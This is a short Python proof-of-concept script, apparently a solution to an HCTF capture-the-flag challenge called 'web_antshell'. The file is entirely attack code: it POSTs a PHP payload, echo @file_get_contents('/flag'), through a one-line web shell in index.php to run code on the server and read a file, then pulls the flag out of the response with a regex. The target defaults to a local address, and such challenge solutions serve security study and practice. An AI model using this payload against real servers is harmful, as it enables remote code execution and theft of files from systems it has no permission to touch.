#!/usr/bin/env python3
# web_antshell PoC：向 index.php 的一句话接口直接 POST 一段读 flag 的 PHP 代码
# Usage: python exp.py [base_url]      (default http://127.0.0.1:8080)
import re
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"

req = urllib.request.Request(
    BASE + "/",
    data=urllib.parse.urlencode(
        {"HCTF": "echo @file_get_contents('/flag');"}).encode(),
)
body = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "replace")

m = re.search(r"hctf\{[^}]*\}", body)
if not m:
    sys.exit("no flag found in response - wrong challenge, or payload failed?")
print(m.group(0))
